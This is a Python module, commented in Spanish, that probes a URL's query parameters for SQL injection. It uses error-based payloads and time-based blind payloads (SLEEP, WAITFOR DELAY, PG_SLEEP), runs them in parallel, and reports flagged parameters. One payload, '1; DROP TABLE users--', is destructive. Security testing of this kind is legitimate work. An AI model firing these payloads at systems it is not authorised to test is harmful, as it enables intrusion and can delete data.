import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "1; DROP TABLE users--"]
ERROR_SIGNATURES = [
    "sql syntax", "you have an error in your sql syntax",
    "mysql_fetch", "mysql_sql_exception", "sqlstate", "ora-",
    "unclosed quotation", "pg_query", "sqlite_", "odbc sql server",
    "incorrect syntax near", "sql server error"
]

TIME_PAYLOADS = [
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--",
    "1' AND SLEEP(3)--",
    "1' OR SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1'; SELECT PG_SLEEP(3)--",
    "1) AND SLEEP(3)--"
]

def test_error_sqli(parsed, params, param, payload, baseline_body="", session=None):
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        r = client.get(test_url, timeout=5)
        body = r.text.lower()
        new_sigs = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
        if new_sigs:
            return {
                "vuln": f"Posible SQLi en parámetro '{param}'",
                "risk": "Alto",
                "detail": f"Error de DB detectado con payload: {payload} (firmas: {', '.join(new_sigs)})"
            }
    except:
        pass
    return None

def test_time_sqli(parsed, params, param, payload, baseline_time, base_url, session=None):
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        start_time = time.time()
        # Tiempo de espera ligeramente mayor al sleep (7 segundos)
        r = client.get(test_url, timeout=7)
        elapsed = time.time() - start_time
        
        # Si la petición tardó al menos 2.8s más que la línea base
        if elapsed >= baseline_time + 2.7:
            # Doble verificación: comprobar que una petición normal responde rápido
            try:
                start_verify = time.time()
                client.get(base_url, timeout=5)
                verify_elapsed = time.time() - start_verify
                
                # Si la verificación normal es rápida, confirmamos que el retraso fue por SQLi
                if verify_elapsed < baseline_time + 1.2:
                    return {
                        "vuln": f"Posible Blind SQLi (Tiempo) en parámetro '{param}'",
                        "risk": "Alto",
                        "detail": f"El servidor tardó {elapsed:.2f}s en responder (Línea base: {baseline_time:.2f}s) con el payload: {payload}"
                    }
            except:
                pass
    except:
        pass
    return None

def check_sqli(url, session=None):
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    baseline_body = ""
    try:
        client = session if session is not None else requests
        start_base = time.time()
        r_base = client.get(url, timeout=5)
        baseline_time = time.time() - start_base
        baseline_body = r_base.text.lower()
    except:
        baseline_time = 1.0

    tasks = []
    
    # 1. Tareas de inyección SQL basadas en errores
    for param in params:
        for payload in ERROR_PAYLOADS:
            tasks.append(("error", param, payload))
            
    # 2. Tareas de inyección SQL ciegas basadas en tiempo
    for param in params:
        for payload in TIME_PAYLOADS:
            tasks.append(("time", param, payload))

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for task_type, param, payload in tasks:
            if task_type == "error":
                fut = executor.submit(test_error_sqli, parsed, params, param, payload, baseline_body, session)
            else:
                fut = executor.submit(test_time_sqli, parsed, params, param, payload, baseline_time, url, session)
            futures[fut] = (param, task_type)

        flagged_params = set()
        for future in as_completed(futures):
            param, task_type = futures[future]
            # Si ya detectamos SQLi en este parámetro, no repetimos alertas
            if param in flagged_params:
                continue
            res = future.result()
            if res:
                results.append(res)
                flagged_params.add(param)

    return results